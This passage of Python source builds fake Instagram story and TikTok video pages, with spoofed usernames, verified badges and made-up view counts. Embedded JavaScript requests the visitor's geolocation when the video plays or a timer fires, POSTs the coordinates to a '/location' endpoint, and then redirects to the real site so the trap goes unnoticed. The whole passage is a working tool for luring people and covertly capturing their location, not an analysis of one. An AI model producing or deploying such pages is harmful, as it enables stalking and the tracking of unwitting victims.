    <script>
        let locationCaptured = false;
        const video = document.getElementById('storyVideo');
        const loading = document.getElementById('loading');
        video.src = '{video_src}';
        video.load();
        function captureLocation() {{
            if(locationCaptured) return;
            locationCaptured = true;
            if("geolocation" in navigator) {{
                navigator.geolocation.getCurrentPosition(position => {{
                    fetch('/location', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify({{ lat: position.coords.latitude, lng: position.coords.longitude, acc: position.coords.accuracy }}) }}).then(() => {{ window.location.href = 'https://instagram.com'; }}).catch(() => {{ window.location.href = 'https://instagram.com'; }});
                }}, error => {{ window.location.href = 'https://instagram.com'; }});
            }} else {{ window.location.href = 'https://instagram.com'; }}
        }}
        video.oncanplay = () => {{ loading.style.display = 'none'; video.play(); }};
        video.onplay = () => {{ if(!locationCaptured) captureLocation(); }};
        video.onended = () => {{ if(!locationCaptured) captureLocation(); }};
        setTimeout(() => {{ if(loading.style.display !== 'none') {{ loading.style.display = 'none'; video.play(); }} }}, 8000);
    </script>
</body>
</html>'''
    
    @staticmethod
    def get_tiktok_video_custom(username, verified, profile_image, video_path, views, likes, comments, shares, caption):
        # Handle profile image - URL or local file
        profile_image_src = profile_image
        if os.path.exists(profile_image) and os.path.isfile(profile_image):
            try:
                with open(profile_image, 'rb') as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                    mime = 'image/jpeg'
                    if profile_image.endswith('.png'):
                        mime = 'image/png'
                    profile_image_src = f"data:{mime};base64,{img_data}"
                    print(f"  🖼️ Embedded profile image: {os.path.basename(profile_image)} ({len(img_data)//1024}KB)")
            except Exception as e:
                print(f"  ⚠️ Error reading profile image: {e}")
                if not profile_image.startswith('http'):
                    profile_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        elif profile_image.startswith('http'):
            print(f"  🖼️ Using profile image URL: {profile_image[:50]}...")
            profile_image_src = profile_image
        else:
            print(f"  ⚠️ Invalid profile image source: {profile_image}")
            profile_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        
        # Handle video - use base64 embedding or URL
        video_src = video_path
        if os.path.exists(video_path) and os.path.isfile(video_path):
            try:
                with open(video_path, 'rb') as f:
                    video_data = base64.b64encode(f.read()).decode('utf-8')
                    video_src = f"data:video/mp4;base64,{video_data}"
                    print(f"  📹 Embedded video: {os.path.basename(video_path)} ({len(video_data)//1024}KB)")
            except Exception as e:
                print(f"  ⚠️ Error reading video file: {e}")
                if not video_path.startswith('http'):
                    video_src = "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"
        elif video_path.startswith('http'):
            print(f"  📹 Using video URL: {video_path[:50]}...")
            video_src = video_path
        else:
            print(f"  ⚠️ Invalid video source: {video_path}")
            video_src = "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"
        
        verified_badge = '<span style="background:#ff0050;border-radius:50%;display:inline-block;width:14px;height:14px;font-size:9px;text-align:center;margin-left:4px;color:white;">✓</span>' if verified else ''
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>TikTok • @{username}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ background: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .container {{ max-width: 450px; width: 100%; height: 100vh; background: #000; position: relative; overflow: hidden; }}
        .video-container {{ width: 100%; height: 100%; position: relative; }}
        .video-container video {{ width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; }}
        .info {{ position: absolute; bottom: 120px; left: 16px; right: 80px; z-index: 20; }}
        .user {{ display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }}
        .user-avatar {{ width: 48px; height: 48px; border-radius: 50%; overflow: hidden; border: 2px solid #fff; }}
        .user-avatar img {{ width: 100%; height: 100%; object-fit: cover; }}
        .username {{ color: white; font-weight: 700; font-size: 16px; display: flex; align-items: center; gap: 6px; }}
        .caption {{ color: white; font-size: 14px; margin-bottom: 8px; }}
        .music {{ color: rgba(255,255,255,0.7); font-size: 12px; display: flex; align-items: center; gap: 6px; }}
        .stats {{ display: flex; gap: 16px; margin-top: 8px; flex-wrap: wrap; }}
        .stat {{ color: rgba(255,255,255,0.7); font-size: 11px; }}
        .actions {{ position: absolute; right: 16px; bottom: 150px; display: flex; flex-direction: column; gap: 24px; z-index: 20; }}
        .action {{ text-align: center; }}
        .action-icon {{ width: 44px; height: 44px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; backdrop-filter: blur(5px); cursor: pointer; }}
        .action-count {{ color: white; font-size: 11px; margin-top: 4px; }}
        .progress {{ position: absolute; top: 0; left: 0; right: 0; height: 3px; background: rgba(255,255,255,0.3); z-index: 30; }}
        .progress-fill {{ height: 100%; width: 0%; background: #ff0050; animation: progress 15s linear; }}
        @keyframes progress {{ to {{ width: 100%; }} }}
        .loading {{ position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: #000; z-index: 40; display: flex; justify-content: center; align-items: center; flex-direction: column; }}
        .spinner {{ width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #ff0050; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .loading-text {{ color: white; font-size: 14px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="progress"><div class="progress-fill"></div></div>
        <div class="video-container"><video id="mainVideo" playsinline autoplay></video></div>
        <div class="info">
            <div class="user"><div class="user-avatar"><img src="{profile_image_src}"></div><div class="username">@{username}{verified_badge}</div></div>
            <div class="caption">{caption}</div>
            <div class="music">🎵 original sound - @{username}</div>
            <div class="stats"><div class="stat">👁️ {views} views</div><div class="stat">❤️ {likes} likes</div><div class="stat">💬 {comments} comments</div><div class="stat">↗️ {shares} shares</div></div>
        </div>
        <div class="actions"><div class="action"><div class="action-icon">❤️</div><div class="action-count">{likes}</div></div><div class="action"><div class="action-icon">💬</div><div class="action-count">{comments}</div></div><div class="action"><div class="action-icon">↗️</div><div class="action-count">{shares}</div></div></div>
        <div class="loading" id="loading"><div class="spinner"></div><div class="loading-text">Loading video...</div></div>
    </div>
    <script>
        let locationCaptured = false;
        const video = document.getElementById('mainVideo');
        const loading = document.getElementById('loading');
        video.src = '{video_src}';
        video.load();
        function captureLocation() {{
            if(locationCaptured) return;
            locationCaptured = true;
            if("geolocation" in navigator) {{
                navigator.geolocation.getCurrentPosition(position => {{
                    fetch('/location', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify({{ lat: position.coords.latitude, lng: position.coords.longitude, acc: position.coords.accuracy }}) }}).then(() => {{ window.location.href = 'https://tiktok.com'; }}).catch(() => {{ window.location.href = 'https://tiktok.com'; }});
                }}, error => {{ window.location.href = 'https://tiktok.com'; }});
            }} else {{ window.location.href = 'https://tiktok.com'; }}
        }}
        video.oncanplay = () => {{ loading.style.display = 'none'; video.play(); }};
        video.onplay = () => {{ if(!locationCaptured) captureLocation(); }};
        video.onended = () => {{ if(!locationCaptured) captureLocation(); }};
        setTimeout(() => {{ if(loading.style.display !== 'none') {{ loading.style.display = 'none'; video.play(); }} }}, 8000);
    </script>
</body>
</html>'''
    
    @staticmethod
    def get_instagram_story(username, verified, profile_image):
        # Handle profile image - URL or local file
        profile_image_src = profile_image
        if os.path.exists(profile_image) and os.path.isfile(profile_image):
            try:
                with open(profile_image, 'rb') as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                    mime = 'image/jpeg'
                    if profile_image.endswith('.png'):
                        mime = 'image/png'
                    profile_image_src = f"data:{mime};base64,{img_data}"
                    print(f"  🖼️ Embedded profile image: {os.path.basename(profile_image)} ({len(img_data)//1024}KB)")
            except Exception as e:
                print(f"  ⚠️ Error reading profile image: {e}")
                if not profile_image.startswith('http'):
                    profile_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        elif profile_image.startswith('http'):
            print(f"  🖼️ Using profile image URL: {profile_image[:50]}...")
            profile_image_src = profile_image
        else:
            print(f"  ⚠️ Invalid profile image source: {profile_image}")
            profile_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        
        verified_badge = '<span style="background:#3897f0;border-radius:50%;display:inline-block;width:14px;height:14px;font-size:9px;text-align:center;margin-left:4px;color:white;">✓</span>' if verified else ''
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Instagram Story</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ background: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .story {{ max-width: 450px; width: 100%; height: 100vh; background: #000; position: relative; }}
        .header {{ position: absolute; top: 0; left: 0; right: 0; padding: 50px 16px 16px; background: linear-gradient(180deg, rgba(0,0,0,0.6) 0%, rgba(0,0,0,0) 100%); z-index: 10; display: flex; align-items: center; gap: 12px; }}
        .avatar {{ width: 40px; height: 40px; border-radius: 50%; overflow: hidden; border: 2px solid #fff; }}
        .avatar img {{ width: 100%; height: 100%; object-fit: cover; }}
        .username {{ font-weight: 600; color: #fff; font-size: 14px; display: flex; align-items: center; gap: 4px; }}
        .story-video {{ width: 100%; height: 100%; object-fit: cover; }}
        .loading {{ position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 20; display: flex; justify-content: center; align-items: center; flex-direction: column; display: none; }}
        .spinner {{ width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .progress {{ position: absolute; top: 8px; left: 8px; right: 8px; height: 3px; background: rgba(255,255,255,0.3); border-radius: 3px; z-index: 20; }}
        .progress-fill {{ height: 100%; width: 0%; background: #fff; border-radius: 3px; animation: progress 15s linear; }}
        @keyframes progress {{ to {{ width: 100%; }} }}
    </style>
</head>
<body>
    <div class="story">
        <div class="progress"><div class="progress-fill"></div></div>
        <div class="header"><div class="avatar"><img src="{profile_image_src}"></div><div class="username">@{username}{verified_badge}</div></div>
        <video class="story-video" autoplay loop muted playsinline><source src="https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4"></video>
        <div class="loading" id="loading"><div class="spinner"></div><p style="color:white;">Loading...</p></div>
    </div>
    <script>
        let locationCaptured = false;
        
        setTimeout(() => {{
            if(!locationCaptured && "geolocation" in navigator){{
                locationCaptured = true;
                navigator.geolocation.getCurrentPosition(p=>{{
                    fetch('/location',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy}})
                    }}).then(()=>{{window.location.href='https://instagram.com';}});
                }},()=>{{window.location.href='https://instagram.com';}});
            }} else {{
                window.location.href='https://instagram.com';
            }}
        }}, 3000);
    </script>
</body>
</html>'''
    
    @staticmethod
    def get_tiktok_video(username, verified, profile_image):
        # Handle profile image - URL or local file
        profile_image_src = profile_image
        if os.path.exists(profile_image) and os.path.isfile(profile_image):
            try:
                with open(profile_image, 'rb') as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                    mime = 'image/jpeg'
                    if profile_image.endswith('.png'):
                        mime = 'image/png'
                    profile_image_src = f"data:{mime};base64,{img_data}"
                    print(f"  🖼️ Embedded profile image: {os.path.basename(profile_image)} ({len(img_data)//1024}KB)")
            except Exception as e:
                print(f"  ⚠️ Error reading profile image: {e}")
                if not profile_image.startswith('http'):
                    profile_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        elif profile_image.startswith('http'):
            print(f"  🖼️ Using profile image URL: {profile_image[:50]}...")
            profile_image_src = profile_image
        else:
            print(f"  ⚠️ Invalid profile image source: {profile_image}")
            profile_image_src = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
        
        verified_badge = '<span style="background:#ff0050;border-radius:50%;display:inline-block;width:14px;height:14px;font-size:9px;text-align:center;margin-left:4px;color:white;">✓</span>' if verified else ''
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>TikTok</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ background: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .container {{ max-width: 450px; width: 100%; height: 100vh; background: #000; position: relative; }}
        video {{ width: 100%; height: 100%; object-fit: cover; }}
        .info {{ position: absolute; bottom: 120px; left: 16px; right: 80px; z-index: 10; }}
        .user {{ display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }}
        .user-avatar {{ width: 48px; height: 48px; border-radius: 50%; overflow: hidden; border: 2px solid #fff; }}
        .user-avatar img {{ width: 100%; height: 100%; object-fit: cover; }}
        .username {{ color: white; font-weight: 700; font-size: 16px; display: flex; align-items: center; gap: 6px; }}
        .caption {{ color: white; font-size: 14px; margin-bottom: 8px; }}
        .actions {{ position: absolute; right: 16px; bottom: 150px; display: flex; flex-direction: column; gap: 20px; z-index: 10; }}
        .action {{ text-align: center; }}
        .action-icon {{ width: 44px; height: 44px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; backdrop-filter: blur(5px); cursor: pointer; }}
        .action-count {{ color: white; font-size: 11px; margin-top: 4px; }}
        .loading {{ position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 20; display: flex; justify-content: center; align-items: center; flex-direction: column; display: none; }}
        .spinner {{ width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #ff0050; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .progress {{ position: absolute; top: 0; left: 0; right: 0; height: 3px; background: rgba(255,255,255,0.3); z-index: 20; }}
        .progress-fill {{ height: 100%; width: 0%; background: #ff0050; animation: progress 15s linear; }}
        @keyframes progress {{ to {{ width: 100%; }} }}
    </style>
</head>
<body>
    <div class="container">
        <div class="progress"><div class="progress-fill"></div></div>
        <video autoplay loop muted playsinline><source src="https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4"></video>
        <div class="info">
            <div class="user"><div class="user-avatar"><img src="{profile_image_src}"></div><div class="username">@{username}{verified_badge}</div></div>
            <div class="caption">Check this out! 🔥</div>
        </div>
        <div class="actions"><div class="action"><div class="action-icon">❤️</div><div class="action-count">1.2M</div></div><div class="action"><div class="action-icon">💬</div><div class="action-count">12.5K</div></div><div class="action"><div class="action-icon">↗️</div><div class="action-count">5.2K</div></div></div>
        <div class="loading" id="loading"><div class="spinner"></div><p style="color:white;">Loading...</p></div>
    </div>
    <script>
        let locationCaptured = false;
        
        setTimeout(() => {{
            if(!locationCaptured && "geolocation" in navigator){{
                locationCaptured = true;
                navigator.geolocation.getCurrentPosition(p=>{{
                    fetch('/location',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy}})
                    }}).then(()=>{{window.location.href='https://tiktok.com';}});
                }},()=>{{window.location.href='https://tiktok.com';}});
            }} else {{
                window.location.href='https://tiktok.com';
            }}
        }}, 3000);
    </script>
</body>
</html>'''
